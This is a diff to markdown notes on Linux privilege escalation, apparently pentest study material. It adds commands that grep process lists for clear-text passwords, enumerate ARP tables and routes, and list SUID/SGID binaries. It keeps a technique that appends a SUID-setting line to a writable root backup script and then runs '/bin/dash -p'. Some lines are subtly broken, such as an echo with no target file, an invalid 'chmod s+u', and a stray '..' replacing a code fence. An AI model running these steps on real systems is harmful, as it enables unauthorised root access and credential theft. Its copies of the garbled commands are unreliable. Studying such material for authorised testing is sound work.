@@ -12,11 +12,13 @@ cat /etc/os-release
 uname -a
 ```
 
-#### Looking at Root Processes
+#### Looking at Root Processes & Clear-Text Passwords
 
 ```bash
 ps aux | grep root --color=auto
 ps -ef --forest | grep root --color=auto
+ps aux | grep pass --color=auto
+ps -ef --forest | grep pass --color=auto
 ```
 
 ### Available Network Interfaces, Routes, and Open Ports
@@ -28,12 +30,14 @@ We can also investigate port bindings to see if a running service is only availa
 An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly reachable from the original attack machine.
 
 ```bash
+ip neigh # arp table
+ip route
 routel # Display network routing tables
 route
 ```
 
 You can display active network connections and listening ports using either netstat or ss, both of which accept the same arguments.
-
+ 
 ```bash
 ss -anp
 netstat -anp
@@ -52,6 +56,8 @@ cat /etc/iptables/rules.v4
 ```
 
 ### Scheduled Tasks
+
+If you see any instance where a script or a cronjob does not specify the full path of a binary, whether it be Windows or Linux, the first thing that should come to mind is path injection. 
 
 Systems acting as servers often periodically execute various automated, scheduled tasks. When these systems are misconfigured, or the user-created files are left with insecure permissions, we can modify these files that will be executed by the scheduling system at a high privilege level.
 
@@ -130,7 +136,7 @@ Any user who manages to subvert a setuid root program to call a command of their
 find / -perm -u=s -type f 2>/dev/null
 ll $(find / -perm -u=s -type f 2>/dev/null )
 find / -perm -g=s -type f 2>/dev/null
-ll $(find / -perm -u=s -type g 2>/dev/null )
+ll $(find / -perm -g=s -type f 2>/dev/null )
 ```
 
 In this case, the command found several SUID binaries. Exploitation of SUID binaries will vary based on several factors. For example, if /bin/cp (the copy command) were SUID, we could copy and overwrite sensitive files such as /etc/passwd.
@@ -217,9 +223,7 @@ Another way is to set a SUID for dash:
 ```bash
 echo >> user_backups.sh
 echo >> "chmod s+u /bin/dash"
-```
-
-```bash
+..
 /bin/dash -p
 ```
 
